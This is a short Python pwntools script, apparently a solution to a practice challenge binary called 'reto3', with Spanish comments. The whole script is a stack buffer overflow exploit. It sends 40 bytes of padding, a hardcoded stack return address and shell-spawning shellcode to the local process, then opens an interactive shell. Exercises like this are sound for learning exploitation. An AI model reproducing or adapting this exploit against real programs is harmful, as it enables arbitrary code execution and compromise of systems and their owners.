#!/usr/bin/env python3
from pwn import *

context.terminal = ["x-terminal-emulator", "-e"]
context.arch = "amd64"
p = process("./reto3")

# attach(p, "break *0x0000000000401197\ncontinue")
payload = b"A"*40
payload += p64(0x7fffffffd8d0) # stack, depender√° de cada sistema
# meter NOP sled tambien?
payload += asm(shellcraft.sh())
p.sendline(payload)

p.interactive()
